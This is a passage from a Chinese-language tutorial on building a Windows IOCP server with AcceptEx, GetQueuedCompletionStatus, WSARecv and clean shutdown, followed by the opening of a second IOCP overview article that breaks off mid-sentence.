多好呢？ 这里在详细讲解一下CreateIoCompletionPort()的几个参数： 123456789 HANDLE WINAPI CreateIoCompletionPort( __in HANDLE FileHandle, // 这里当然是连入的这个套接字句柄了 __in_opt HANDLE ExistingCompletionPort, // 这个就是前面创建的那个完成端口 __in ULONG_PTR CompletionKey, // 这个参数就是类似于线程参数一样，在 // 绑定的时候把自己定义的结构体指针传递 // 这样到了Worker线程中，也可以使用这个 // 结构体的数据了，相当于参数的传递 __in DWORD NumberOfConcurrentThreads // 这里同样置0); 到此才算是Socket全部初始化完毕了。 初始化Socket完毕之后，就可以在这个Socket上投递AcceptEx请求了。 【第四步】在这个监听Socket上投递AcceptEx请求 这里的处理比较复杂。 这个AcceptEx比较特别，而且这个是微软专门在Windows操作系统里面提供的扩展函数，也就是说这个不是Winsock2标准里面提供的，是微软为了方便咱们使用重叠I/O机制，额外提供的一些函数，所以在使用之前也还是需要进行些准备工作。 微软的实现是通过mswsock.dll中提供的，所以我们可以通过静态链接mswsock.lib来使用AcceptEx。但是这是一个不推荐的方式，我们应该用WSAIoctl 配合SIO_GET_EXTENSION_FUNCTION_POINTER参数来获取函数的指针，然后再调用AcceptEx。 这是为什么呢？因为我们在未取得函数指针的情况下就调用AcceptEx的开销是很大的，因为AcceptEx 实际上是存在于Winsock2结构体系之外的(因为是微软另外提供的)，所以如果我们直接调用AcceptEx的话，首先我们的代码就只能在微软的平台上用了，没有办法在其他平台上调用到该平台提供的AcceptEx的版本(如果有的话)， 而且更糟糕的是，我们每次调用AcceptEx时，Service Provider都得要通过WSAIoctl()获取一次该函数指针，效率太低了，所以还不如我们自己直接在代码中直接去这么获取一下指针好了。 获取AcceptEx函数指针的代码大致如下： 123456789101112131415 LPFN_ACCEPTEX m_lpfnAcceptEx; // AcceptEx函数指针GUID GuidAcceptEx = WSAID_ACCEPTEX; // GUID，这个是识别AcceptEx函数必须的DWORD dwBytes = 0; WSAIoctl( m_pListenContext-&gt;m_Socket, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;GuidAcceptEx, sizeof(GuidAcceptEx), &amp;m_lpfnAcceptEx, sizeof(m_lpfnAcceptEx), &amp;dwBytes, NULL, NULL); 具体实现就没什么可说的了，因为都是固定的套路，那个GUID是微软给定义好的，直接拿过来用就行了，WSAIoctl()就是通过这个找到AcceptEx的地址的，另外需要注意的是，通过WSAIoctl获取AcceptEx函数指针时，只需要随便传递给WSAIoctl()一个有效的SOCKET即可，该Socket的类型不会影响获取的AcceptEx函数指针。 然后，我们就可以通过其中的指针m_lpfnAcceptEx调用AcceptEx函数了。 AcceptEx函数的定义如下： 12345678910BOOL AcceptEx ( SOCKET sListenSocket, SOCKET sAcceptSocket, PVOID lpOutputBuffer, DWORD dwReceiveDataLength, DWORD dwLocalAddressLength, DWORD dwRemoteAddressLength, LPDWORD lpdwBytesReceived, LPOVERLAPPED lpOverlapped ); 参数1–sListenSocket, 这个就是那个唯一的用来监听的Socket了，没什么说的；参数2–sAcceptSocket, 用于接受连接的socket，这个就是那个需要我们事先建好的，等有客户端连接进来直接把这个Socket拿给它用的那个，是AcceptEx高性能的关键所在。参数3–lpOutputBuffer,接收缓冲区， 这也是AcceptEx比较有特色的地方，既然AcceptEx不是普通的accpet函数，那么这个缓冲区也不是普通的缓冲区，这个缓冲区包含了三个信息：一是客户端发来的第一组数据，二是server的地址，三是client地址，都是精华啊…但是读取起来就会很麻烦，不过后面有一个更好的解决方案。参数4–dwReceiveDataLength，前面那个参数lpOutputBuffer中用于存放数据的空间大小。如果此参数=0，则Accept时将不会待数据到来，而直接返回，如果此参数不为0，那么一定得等接收到数据了才会返回…… 所以通常当需要Accept接收数据时，就需要将该参数设成为：sizeof(lpOutputBuffer) - 2*(sizeof sockaddr_in +16)，也就是说总长度减去两个地址空间的长度就是了，看起来复杂，其实想明白了也没啥…… 参数5–dwLocalAddressLength，存放本地址地址信息的空间大小；参数6–dwRemoteAddressLength，存放本远端地址信息的空间大小；参数7–lpdwBytesReceived，out参数，对我们来说没用，不用管；参数8–lpOverlapped，本次重叠I/O所要用到的重叠结构。 这里面的参数倒是没什么，看起来复杂，但是咱们依旧可以一个一个传进去，然后在对应的IO操作完成之后，这些参数Windows内核自然就会帮咱们填满了。 但是非常悲催的是，我们这个是异步操作，我们是在线程启动的地方投递的这个操作， 等我们再次见到这些个变量的时候，就已经是在Worker线程内部了，因为Windows会直接把操作完成的结果传递到Worker线程里，这样咱们在启动的时候投递了那么多的IO请求，这从Worker线程传回来的这些结果，到底是对应着哪个IO请求的呢？。。。。 聪明的你肯定想到了，是的，Windows内核也帮我们想到了：用一个标志来绑定每一个IO操作，这样到了Worker线程内部的时候，收到网络操作完成的通知之后，再通过这个标志来找出这组返回的数据到底对应的是哪个Io操作的。 这里的标志就是如下这样的结构体： 12345678typedef struct _PER_IO_CONTEXT&#123; OVERLAPPED m_Overlapped; // 每一个重叠I/O网络操作都要有一个 SOCKET m_sockAccept; // 这个I/O操作所使用的Socket，每个连接的都是一样的 WSABUF m_wsaBuf; // 存储数据的缓冲区，用来给重叠操作传递参数的，关于WSABUF后面还会讲 char m_szBuffer[MAX_BUFFER_LEN]; // 对应WSABUF里的缓冲区 OPERATION_TYPE m_OpType; // 标志这个重叠I/O操作是做什么的，例如Accept/Recv等&#125; PER_IO_CONTEXT, *PPER_IO_CONTEXT; 这个结构体的成员当然是我们随便定义的，里面的成员你可以随意修改(除了OVERLAPPED那个之外……)。 但是AcceptEx不是普通的accept，buffer不是普通的buffer，那么这个结构体当然也不能是普通的结构体了…… 在完成端口的世界里，这个结构体有个专属的名字“单IO数据”，是什么意思呢？也就是说每一个重叠I/O都要对应的这么一组参数，至于这个结构体怎么定义无所谓，而且这个结构体也不是必须要定义的，但是没它……还真是不行，我们可以把它理解为线程参数，就好比你使用线程的时候，线程参数也不是必须的，但是不传还真是不行…… 除此以外，我们也还会想到，既然每一个I/O操作都有对应的PER_IO_CONTEXT结构体，而在每一个Socket上，我们会投递多个I/O请求的，例如我们就可以在监听Socket上投递多个AcceptEx请求，所以同样的，我们也还需要一个“单句柄数据”来管理这个句柄上所有的I/O请求，这里的“句柄”当然就是指的Socket了，我在代码中是这样定义的： 123456789 typedef struct _PER_SOCKET_CONTEXT&#123; SOCKET m_Socket; // 每一个客户端连接的Socket SOCKADDR_IN m_ClientAddr; // 这个客户端的地址 CArray&lt;_PER_IO_CONTEXT*&gt; m_arrayIoContext; // 数组，所有客户端IO操作的参数， // 也就是说对于每一个客户端Socket // 是可以在上面同时投递多个IO请求的&#125; PER_SOCKET_CONTEXT, *PPER_SOCKET_CONTEXT; 这也是比较好理解的，也就是说我们需要在一个Socket句柄上，管理在这个Socket上投递的每一个IO请求的_PER_IO_CONTEXT。 当然，同样的，各位对于这些也可以按照自己的想法来随便定义，只要能起到管理每一个IO请求上需要传递的网络参数的目的就好了，关键就是需要跟踪这些参数的状态，在必要的时候释放这些资源，不要造成内存泄漏，因为作为Server总是需要长时间运行的，所以如果有内存泄露的情况那是非常可怕的，一定要杜绝一丝一毫的内存泄漏。 至于具体这两个结构体参数是如何在Worker线程里大发神威的，我们后面再看。 以上就是我们全部的准备工作了，具体的实现各位可以配合我的流程图再看一下示例代码，相信应该会理解得比较快。 完成端口初始化的工作比起其他的模型来讲是要更复杂一些，所以说对于主线程来讲，它总觉得自己付出了很多，总觉得Worker线程是坐享其成，但是Worker自己的苦只有自己明白，Worker线程的工作一点也不比主线程少，相反还要更复杂一些，并且具体的通信工作全部都是Worker线程来完成的，Worker线程反而还觉得主线程是在旁边看热闹，只知道发号施令而已，但是大家终究还是谁也离不开谁，这也就和公司里老板和员工的微妙关系是一样的吧…… 【第五步】我们再来看看Worker线程都做了些什么 _Worker线程的工作都是涉及到具体的通信事务问题，主要完成了如下的几个工作，让我们一步一步的来看。 (1) 使用 GetQueuedCompletionStatus() 监控完成端口 首先这个工作所要做的工作大家也能猜到，无非就是几个Worker线程哥几个一起排好队队来监视完成端口的队列中是否有完成的网络操作就好了，代码大体如下： 1234567891011 void *lpContext = NULL;OVERLAPPED *pOverlapped = NULL;DWORD dwBytesTransfered = 0; BOOL bReturn = GetQueuedCompletionStatus( pIOCPModel-&gt;m_hIOCompletionPort, &amp;dwBytesTransfered, (LPDWORD)&amp;lpContext, &amp;pOverlapped, INFINITE ); 各位留意到其中的GetQueuedCompletionStatus()函数了吗？这个就是Worker线程里第一件也是最重要的一件事了，这个函数的作用就是我在前面提到的，会让Worker线程进入不占用CPU的睡眠状态，直到完成端口上出现了需要处理的网络操作或者超出了等待的时间限制为止。 一旦完成端口上出现了已完成的I/O请求，那么等待的线程会被立刻唤醒，然后继续执行后续的代码。 至于这个神奇的函数，原型是这样的： 12345678 BOOL WINAPI GetQueuedCompletionStatus( __in HANDLE CompletionPort, // 这个就是我们建立的那个唯一的完成端口 __out LPDWORD lpNumberOfBytes, //这个是操作完成后返回的字节数 __out PULONG_PTR lpCompletionKey, // 这个是我们建立完成端口的时候绑定的那个自定义结构体参数 __out LPOVERLAPPED *lpOverlapped, // 这个是我们在连入Socket的时候一起建立的那个重叠结构 __in DWORD dwMilliseconds // 等待完成端口的超时时间，如果线程不需要做其他的事情，那就INFINITE就行了 ); 所以，如果这个函数突然返回了，那就说明有需要处理的网络操作了 — 当然，在没有出现错误的情况下。 然后switch()一下，根据需要处理的操作类型，那我们来进行相应的处理。 但是如何知道操作是什么类型的呢？这就需要用到从外部传递进来的loContext参数，也就是我们封装的那个参数结构体，这个参数结构体里面会带有我们一开始投递这个操作的时候设置的操作类型，然后我们根据这个操作再来进行对应的处理。 但是还有问题，这个参数究竟是从哪里传进来的呢？传进来的时候内容都有些什么？ 这个问题问得好！ 首先，我们要知道两个关键点： (1) 这个参数，是在你绑定Socket到一个完成端口的时候，用的CreateIoCompletionPort()函数，传入的那个CompletionKey参数，要是忘了的话，就翻到文档的“第三步”看看相关的内容；我们在这里传入的是定义的PER_SOCKET_CONTEXT，也就是说“单句柄数据”，因为我们绑定的是一个Socket，这里自然也就需要传入Socket相关的上下文，你是怎么传过去的，这里收到的就会是什么样子，也就是说这个lpCompletionKey就是我们的PER_SOCKET_CONTEXT，直接把里面的数据拿出来用就可以了。 (2) 另外还有一个很神奇的地方，里面的那个lpOverlapped参数，里面就带有我们的PER_IO_CONTEXT。这个参数是从哪里来的呢？我们去看看前面投递AcceptEx请求的时候，是不是传了一个重叠参数进去？这里就是它了，并且，我们可以使用一个很神奇的宏，把和它存储在一起的其他的变量，全部都读取出来，例如： PER_IO_CONTEXT* pIoContext = CONTAINING_RECORD(lpOverlapped, PER_IO_CONTEXT, m_Overlapped); 这个宏的含义，就是去传入的lpOverlapped变量里，找到和结构体中PER_IO_CONTEXT中m_Overlapped成员相关的数据。 你仔细想想，其实真的很神奇…… 但是要做到这种神奇的效果，应该确保我们在结构体PER_IO_CONTEXT定义的时候，把Overlapped变量，定义为结构体中的第一个成员。 只要各位能弄清楚这个GetQueuedCompletionStatus()中各种奇怪的参数，那我们就离成功不远了。 既然我们可以获得PER_IO_CONTEXT结构体，那么我们就自然可以根据其中的m_OpType参数，得知这次收到的这个完成通知，是关于哪个Socket上的哪个I/O操作的，这样就分别进行对应处理就好了。 在我的示例代码里，在有AcceptEx请求完成的时候，我是执行的_DoAccept()函数，在有WSARecv请求完成的时候，执行的是_DoRecv()函数，下面我就分别讲解一下这两个函数的执行流程。 【第六步】当收到Accept通知时 _DoAccept() 在用户收到AcceptEx的完成通知时，需要后续代码并不多，但却是逻辑最为混乱，最容易出错的地方，这也是很多用户为什么宁愿用效率低下的accept()也不愿意去用AcceptEx的原因吧。 和普通的Socket通讯方式一样，在有客户端连入的时候，我们需要做三件事情： (1) 为这个新连入的连接分配一个Socket； (2) 在这个Socket上投递第一个异步的发送/接收请求； (3) 继续监听。 其实都是一些很简单的事情但是由于“单句柄数据”和“单IO数据”的加入，事情就变得比较乱。因为是这样的，让我们一起缕一缕啊，最好是配合代码一起看，否则太抽象了…… (1) 首先，_Worker线程通过GetQueuedCompletionStatus()里会收到一个lpCompletionKey，这个也就是PER_SOCKET_CONTEXT，里面保存了与这个I/O相关的Socket和Overlapped还有客户端发来的第一组数据等等，对吧？但是这里得注意，这个SOCKET的上下文数据，是关于监听Socket的，而不是新连入的这个客户端Socket的，千万别弄混了…… (2) 所以，AcceptEx不是给咱们新连入的这个Socket早就建好了一个Socket吗？所以这里，我们需要再用这个新Socket重新为新客户端建立一个PER_SOCKET_CONTEXT，以及下面一系列的新PER_IO_CONTEXT，千万不要去动传入的这个Listen Socket上的PER_SOCKET_CONTEXT，也不要用传入的这个Overlapped信息，因为这个是属于AcceptEx I/O操作的，也不是属于你投递的那个Recv I/O操作的……，要不你下次继续监听的时候就悲剧了…… (3) 等到新的Socket准备完毕了，我们就赶紧还是用传入的这个Listen Socket上的PER_SOCKET_CONTEXT和PER_IO_CONTEXT去继续投递下一个AcceptEx，循环起来，留在这里太危险了，早晚得被人给改了…… (4) 而我们新的Socket的上下文数据和I/O操作数据都准备好了之后，我们要做两件事情：一件事情是把这个新的Socket和我们唯一的那个完成端口绑定，这个就不用细说了，和前面绑定监听Socket是一样的；然后就是在这个Socket上投递第一个I/O操作请求，在我的示例代码里投递的是WSARecv()。因为后续的WSARecv，就不是在这里投递的了，这里只负责第一个请求。 但是，至于WSARecv请求如何来投递的，我们放到下一节中去讲，这一节，我们还有一个很重要的事情，我得给大家提一下，就是在客户端连入的时候，我们如何来获取客户端的连入地址信息。 这里我们还需要引入另外一个很高端的函数，GetAcceptExSockAddrs()，它和AcceptEx()一样，都是微软提供的扩展函数，所以同样需要通过下面的方式来导入才可以使用…… 12345678910WSAIoctl( m_pListenContext-&gt;m_Socket, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;GuidGetAcceptExSockAddrs, sizeof(GuidGetAcceptExSockAddrs), &amp;m_lpfnGetAcceptExSockAddrs, sizeof(m_lpfnGetAcceptExSockAddrs), &amp;dwBytes, NULL, NULL); 和导出AcceptEx一样一样的，同样是需要用其GUID来获取对应的函数指针 m_lpfnGetAcceptExSockAddrs 。 说了这么多，这个函数究竟是干嘛用的呢？它是名副其实的“AcceptEx之友”，为什么这么说呢？因为我前面提起过AcceptEx有个很神奇的功能，就是附带一个神奇的缓冲区，这个缓冲区厉害了，包括了客户端发来的第一组数据、本地的地址信息、客户端的地址信息，三合一啊，你说神奇不神奇？ 这个函数从它字面上的意思也基本可以看得出来，就是用来解码这个缓冲区的，是的，它不提供别的任何功能，就是专门用来解析AcceptEx缓冲区内容的。例如如下代码： 12345678 PER_IO_CONTEXT* pIoContext = 本次通信用的I/O Context SOCKADDR_IN* ClientAddr = NULL;SOCKADDR_IN* LocalAddr = NULL; int remoteLen = sizeof(SOCKADDR_IN), localLen = sizeof(SOCKADDR_IN); m_lpfnGetAcceptExSockAddrs(pIoContext-&gt;m_wsaBuf.buf, pIoContext-&gt;m_wsaBuf.len - ((sizeof(SOCKADDR_IN)+16)*2), sizeof(SOCKADDR_IN)+16, sizeof(SOCKADDR_IN)+16, (LPSOCKADDR*)&amp;LocalAddr, &amp;localLen, (LPSOCKADDR*)&amp;ClientAddr, &amp;remoteLen); 解码完毕之后，于是，我们就可以从如下的结构体指针中获得很多有趣的地址信息了： inet_ntoa(ClientAddr-&gt;sin_addr) 是客户端IP地址 ntohs(ClientAddr-&gt;sin_port) 是客户端连入的端口 inet_ntoa(LocalAddr -&gt;sin_addr) 是本地IP地址 ntohs(LocalAddr -&gt;sin_port) 是本地通讯的端口 pIoContext-&gt;m_wsaBuf.buf 是存储客户端发来第一组数据的缓冲区 自从用了“AcceptEx之友”，一切都清净了…. 【第七步】当收到Recv通知时, _DoRecv() 在讲解如何处理Recv请求之前，我们还是先讲一下如何投递WSARecv请求的。 WSARecv大体的代码如下，其实就一行，在代码中我们可以很清楚的看到我们用到了很多新建的PerIoContext的参数，这里再强调一下，注意一定要是自己另外新建的啊，一定不能是Worker线程里传入的那个PerIoContext，因为那个是监听Socket的，别给人弄坏了……： int nBytesRecv = WSARecv(pIoContext-&gt;m_Socket, pIoContext -&gt;p_wbuf, 1, &amp;dwBytes, 0, pIoContext-&gt;p_ol, NULL); 这里，我再把WSARev函数的原型再给各位讲一下 123456789101112 int WSARecv( SOCKET s, // 当然是投递这个操作的套接字 LPWSABUF lpBuffers, // 接收缓冲区 // 这里需要一个由WSABUF结构构成的数组 DWORD dwBufferCount, // 数组中WSABUF结构的数量，设置为1即可 LPDWORD lpNumberOfBytesRecvd, // 如果接收操作立即完成，这里会返回函数调用所接收到的字节数 LPDWORD lpFlags, // 说来话长了，我们这里设置为0 即可 LPWSAOVERLAPPED lpOverlapped, // 这个Socket对应的重叠结构 NULL // 这个参数只有完成例程模式才会用到， // 完成端口中我们设置为NULL即可); 其实里面的参数，如果你们熟悉或者看过我以前的重叠I/O的文章，应该都比较熟悉，只需要注意其中的两个参数： LPWSABUF lpBuffers; 这里是需要我们自己new 一个 WSABUF 的结构体传进去的； 如果你们非要追问 WSABUF 结构体是个什么东东？我就给各位多说两句，就是在ws2def.h中有定义的，定义如下： 123456 typedef struct _WSABUF &#123; ULONG len; /* the length of the buffer */ __field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */ &#125; WSABUF, FAR * LPWSABUF; 而且好心的微软还附赠了注释，真不容易…. 看到了吗？如果对于里面的一些奇怪符号你们看不懂的话，也不用管他，只用看到一个ULONG和一个CHAR*就可以了，这不就是一个是缓冲区长度，一个是缓冲区指针么？至于那个什么 FAR……让他见鬼去吧，现在已经是32位和64位时代了…… 这里需要注意的，我们的应用程序接到数据到达的通知的时候，其实数据已经被咱们的主机接收下来了，我们直接通过这个WSABUF指针去系统缓冲区拿数据就好了，而不像那些没用重叠I/O的模型，接收到有数据到达的通知的时候还得自己去另外recv，太低端了……这也是为什么重叠I/O比其他的I/O性能要好的原因之一。 LPWSAOVERLAPPED lpOverlapped 这个参数就是我们所谓的重叠结构了，就是这样定义，然后在有Socket连接进来的时候，生成并初始化一下，然后在投递第一个完成请求的时候，作为参数传递进去就可以， 123OVERLAPPED* m_pol = new OVERLAPPED;ZeroMemory(m_pol, sizeof(OVERLAPPED)); 在第一个重叠请求完毕之后，我们的这个OVERLAPPED 结构体里，就会被分配有效的系统参数了，并且我们是需要每一个Socket上的每一个I/O操作类型，都要有一个唯一的Overlapped结构去标识。 这样，投递一个WSARecv就讲完了，至于_DoRecv()需要做些什么呢？其实就是做两件事： (1) 把WSARecv里这个缓冲区里收到的数据显示出来； (2) 发出下一个WSARecv()； Over…… 至此，我们终于深深的喘口气了，完成端口的大部分工作我们也完成了，也非常感谢各位耐心的看我这么枯燥的文字一直看到这里，真是一个不容易的事情！！ 【第八步】如何关闭完成端口 休息完毕，我们继续…… 各位看官不要高兴得太早，虽然我们已经让我们的完成端口顺利运作起来了，但是在退出的时候如何释放资源咱们也是要知道的，否则岂不是功亏一篑…… 从前面的章节中，我们已经了解到，Worker线程一旦进入了GetQueuedCompletionStatus()的阶段，就会进入睡眠状态，INFINITE的等待完成端口中，如果完成端口上一直都没有已经完成的I/O请求，那么这些线程将无法被唤醒，这也意味着线程没法正常退出。 熟悉或者不熟悉多线程编程的朋友，都应该知道，如果在线程睡眠的时候，简单粗暴的就把线程关闭掉的话，那是会一个很可怕的事情，因为很多线程体内很多资源都来不及释放掉，无论是这些资源最后是否会被操作系统回收，我们作为一个C++程序员来讲，都不应该允许这样的事情出现。 所以我们必须得有一个很优雅的，让线程自己退出的办法。 这时会用到我们这次见到的与完成端口有关的最后一个API，叫 PostQueuedCompletionStatus()，从名字上也能看得出来，这个是和 GetQueuedCompletionStatus() 函数相对的，这个函数的用途就是可以让我们手动的添加一个完成端口I/O操作，这样处于睡眠等待的状态的线程就会有一个被唤醒，如果为我们每一个Worker线程都调用一次PostQueuedCompletionStatus()的话，那么所有的线程也就会因此而被唤醒了。 PostQueuedCompletionStatus()函数的原型是这样定义的： 123456BOOL WINAPI PostQueuedCompletionStatus( __in HANDLE CompletionPort, __in DWORD dwNumberOfBytesTransferred, __in ULONG_PTR dwCompletionKey, __in_opt LPOVERLAPPED lpOverlapped); 我们可以看到，这个函数的参数几乎和GetQueuedCompletionStatus()的一模一样，都是需要把我们建立的完成端口传进去，然后后面的三个参数是 传输字节数、结构体参数、重叠结构的指针. 注意，这里也有一个很神奇的事情，正常情况下，GetQueuedCompletionStatus()获取回来的参数本来是应该是系统帮我们填充的，或者是在绑定完成端口时就有的，但是我们这里却可以直接使用PostQueuedCompletionStatus()直接将后面三个参数传递给GetQueuedCompletionStatus()，这样就非常方便了。 例如，我们为了能够实现通知线程退出的效果，可以自己定义一些约定，比如把这后面三个参数设置一个特殊的值，然后Worker线程接收到完成通知之后，通过判断这3个参数中是否出现了特殊的值，来决定是否是应该退出线程了。 例如我们在调用的时候，就可以这样： 1234for (int i = 0; i &lt; m_nThreads; i++)&#123; PostQueuedCompletionStatus(m_hIOCompletionPort, 0, (DWORD) NULL, NULL);&#125; 为每一个线程都发送一个完成端口数据包，有几个线程就发送几遍，把其中的dwCompletionKey参数设置为NULL，这样每一个Worker线程在接收到这个完成通知的时候，再自己判断一下这个参数是否被设置成了NULL，因为正常情况下，这个参数总是会有一个非NULL的指针传入进来的，如果Worker发现这个参数被设置成了NULL，那么Worker线程就会知道，这是应用程序再向Worker线程发送的退出指令，这样Worker线程在内部就可以自己很“优雅”的退出了…… 学会了吗？ 但是这里有一个很明显的问题，聪明的朋友一定想到了，而且只有想到了这个问题的人，才算是真正看明白了这个方法。 我们只是发送了m_nThreads次，我们如何能确保每一个Worker线程正好就收到一个，然后所有的线程都正好退出呢？是的，我们没有办法保证，所以很有可能一个Worker线程处理完一个完成请求之后，发生了某些事情，结果又再次去循环接收下一个完成请求了，这样就会造成有的Worker线程没有办法接收到我们发出的退出通知。 所以，我们在退出的时候，一定要确保Worker线程只调用一次GetQueuedCompletionStatus()，这就需要我们自己想办法了，各位请参考我在Worker线程中实现的代码，我搭配了一个退出的Event，在退出的时候SetEvent一下，来确保Worker线程每次就只会调用一轮 GetQueuedCompletionStatus() ，这样就应该比较安全了。 另外，在Vista/Win7系统中，我们还有一个更简单的方式，我们可以直接CloseHandle关掉完成端口的句柄，这样所有在GetQueuedCompletionStatus()的线程都会被唤醒，并且返回FALSE，这时调用GetLastError()获取错误码时，会返回ERROR_INVALID_HANDLE，这样每一个Worker线程就可以通过这种方式轻松简单的知道自己该退出了。当然，如果我们不能保证我们的应用程序只在Vista/Win7中，那还是老老实实的PostQueuedCompletionStatus()吧。 最后，在系统释放资源的最后阶段，切记，因为完成端口同样也是一个Handle，所以也得用CloseHandle将这个句柄关闭，当然还要记得用closesocket关闭一系列的socket，还有别的各种指针什么的，这都是作为一个合格的C++程序员的基本功，在这里就不多说了，如果还是有不太清楚的朋友，请参考我的示例代码中的 StopListen() 和DeInitialize() 函数。 六． 完成端口使用中的注意事项 终于到了文章的结尾了，不知道各位朋友是基本学会了完成端口的使用了呢，还是被完成端口以及我这么多口水的文章折磨得不行了…… 最后再补充一些前面没有提到了，实际应用中的一些注意事项吧。 Socket的通信缓冲区设置成多大合适？ 在x86的体系中，内存页面是以4KB为单位来锁定的，也就是说，就算是你投递WSARecv()的时候只用了1KB大小的缓冲区，系统还是得给你分4KB的内存。为了避免这种浪费，最好是把发送和接收数据的缓冲区直接设置成4KB的倍数。 关于完成端口通知的次序问题 这个不用想也能知道，调用GetQueuedCompletionStatus() 获取I/O完成端口请求的时候，肯定是用先入先出的方式来进行的。 但是，咱们大家可能都想不到的是，唤醒那些调用了GetQueuedCompletionStatus()的线程是以后入先出的方式来进行的。 比如有4个线程在等待，如果出现了一个已经完成的I/O项，那么是最后一个调用GetQueuedCompletionStatus()的线程会被唤醒。平常这个次序倒是不重要，但是在对数据包顺序有要求的时候，比如传送大块数据的时候，是需要注意下这个先后次序的。 – 微软之所以这么做，那当然是有道理的，这样如果反复只有一个I/O操作而不是多个操作完成的话，内核就只需要唤醒同一个线程就可以了，而不需要轮着唤醒多个线程，节约了资源，而且可以把其他长时间睡眠的线程换出内存，提到资源利用率。 如果各位想要传输文件… 如果各位需要使用完成端口来传送文件的话，这里有个非常需要注意的地方。因为发送文件的做法，按照正常人的思路来讲，都会是先打开一个文件，然后不断的循环调用ReadFile()读取一块之后，然后再调用WSASend ()去发发送。 但是我们知道，ReadFile()的时候，是需要操作系统通过磁盘的驱动程序，到实际的物理硬盘上去读取文件的，这就会使得操作系统从用户态转换到内核态去调用驱动程序，然后再把读取的结果返回至用户态；同样的道理，WSARecv()也会涉及到从用户态到内核态切换的问题 — 这样就使得我们不得不频繁的在用户态到内核态之间转换，效率低下…… 而一个非常好的解决方案是使用微软提供的扩展函数TransmitFile()来传输文件，因为只需要传递给TransmitFile()一个文件的句柄和需要传输的字节数，程序就会整个切换至内核态，无论是读取数据还是发送文件，都是直接在内核态中执行的，直到文件传输完毕才会返回至用户态给主进程发送通知。这样效率就高多了。 关于重叠结构数据释放的问题 我们既然使用的是异步通讯的方式，就得要习惯一点，就是我们投递出去的完成请求，不知道什么时候我们才能收到操作完成的通知，而在这段等待通知的时间，我们就得要千万注意得保证我们投递请求的时候所使用的变量在此期间都得是有效的。 例如我们发送WSARecv请求时候所使用的Overlapped变量，因为在操作完成的时候，这个结构里面会保存很多很重要的数据，对于设备驱动程序来讲，指示保存着我们这个Overlapped变量的指针，而在操作完成之后，驱动程序会将Buffer的指针、已经传输的字节数、错误码等等信息都写入到我们传递给它的那个Overlapped指针中去。如果我们已经不小心把Overlapped释放了，或者是又交给别的操作使用了的话，谁知道驱动程序会把这些东西写到哪里去呢？岂不是很崩溃…… 暂时我想到的问题就是这么多吧，如果各位真的是要正儿八经写一个承受很大访问压力的Server的话，你慢慢就会发现，只用我附带的这个示例代码是不够的，还得需要在很多细节之处进行改进，例如用更好的数据结构来管理上下文数据，并且需要非常完善的异常处理机制等等，总之，非常期待大家的批评和指正。 谢谢大家看到这里！！！ ※WinSock IOCP 模型总结(附一个带缓存池的IOCP类)[20] ※前言 本文配套代码：https://github.com/TTGuoying/IOCPServer 由于篇幅原因，本文假设你已经熟悉了利用Socket进行TCP/IP编程的基本原理，并且也熟练的掌握了多线程编程技术，太基本的概念我这里就略过不提了，网上的资料应该遍地都是。 IOCP全称IOCP全称I/O Completion Port，中文译为I/O完成端口。IOCP是一个异步I/O的Windows I/O模型，它可以自动处理I/O操作，并在I/O操作完成后将完成通知发送给用户。本文主要介绍基于IOCP的网络I/O操作（即socket的Accept、Send、Recv和Close等）。Windows提供了6种网络通信模型，分别是： 阻塞模型：accept、recv和send操作会阻塞线程，直到操作完成，极其低效。 选择(select)模型：轮询方式探测socket上是否有收发的操作，再调用accept、recv和send操作，核心是select()函数，比阻塞模型高效一点，缺点是一次只能探测64个socket，需要手动调用recv和send进行收发数据。 异步选择(WSAAsyncSelect)模型：利用Windows窗口消息机制响应socket操作，即当socket上有Accept、Send、Recv和Close操作发生时发送一条自定义消息给指定窗口，在窗口中响应socket操作，需要手动调用recv和send进行收发数据。与select模型相比，不需要轮询方式探测socket，socket上有操作发生即发送通知给窗口窗口，缺点是需要一个窗口对象处理socket的消息，需要手动调用recv和send进行收发数据。 事件选择(WSAEventSelect)模型：原理基本同WSAAsyncSelect模型，但是不需要窗口，利用事件（Event）机制来获取socket上发生的I/O操作。缺点是一次只能等待64个事件，需要手动调用recv和send进行收发数据。 重叠 I/O(Overlapped I/O)模型：利用重叠数据结构(WSAOVERLAPPED)，一次投递一个或多个Winsock I/O请求，等这些请求完成后，应用程序会收到通知，用户可以直接使用 I/O操作返回的数据。简单的说：投递一个WSASend请求和接受数据的缓冲区，系统在接收完成后在通知用户，用户可以直接使用收到的数据，WSASend操作同理。有两种方式来管理重叠IO请求的完成情况（就是说接到重叠操作完成的通知）： 事件对象通知(event object notification) 完成例程(completion routines) ,注意，这里并不是完成端口 优点是不用管收发过程，直接提供（发送时）/使用（接收时）数据。缺点是实现略复杂。 IOCP(I/O Completion Port)模型：本文要介绍的模型，见下文。 以上I/O模型由1-6理解难度依次提高，性能也相应地依次提高，我个人觉得重叠 I/O(Overlapped I/O)模型和IOCP(I/O Completion Port)模型并不是实现难度大，而是理解其运行机制的难度，5和6的使用比前面几种所需代码更少，更简单。下面开始正式介绍IOCP(I/O Completion Port)模型。 ※相关概念 1、异步通信 我们知道外部设备I/O（比如磁盘读写，网络通信等）速度和CPU速度比起来是很慢的，如果我们进行外部I/O操作时在线程中等待I/O操作完成的话，此线程就会被阻塞住，相当于强迫CPU适应I/O设备的速度，这样会造成极大的CPU资源浪费。我们没必要在线程中等待I/O操作完成再执行后续的代码，而是将I/O操作请求交给设备驱动去处理，我们线程可以继续做其他事情，然后等待I/O操作完成的通知，大体的流程如下图所示： 我们可以从图中看到一个很明显的并行操作的过程，这就是异步调用，而“同步”的通信方式是再进行网络操作的时候主线程就挂起等待直到网络操作完成之后才可以执行后续的代码。同步方式流程如下图： “异步”方式无疑比“阻塞＋多线程”的方式效率要高得多。在Windows中实现异步的机制有好几种，主要区别是图一中的最后一步“通知主线程”的方式。实现操作系统调用驱动程序去收发数据的操作都是一样的，关键是“如何通知主线程取数据”。有兴趣的朋友可以搜索关键字“设备内核对象”、“事件内核对象”、APC（synchronous Procedure Call，异步过程调用）和IOCP（完成端口）。 ２、重叠结构（OVERLAPPED） 在Windows中要实现异步通信，必须要用到重叠结构（OVERLAPPED），Windows中所有的异步通信都是基于它的。至于为什么叫Overlapped？Jeffrey 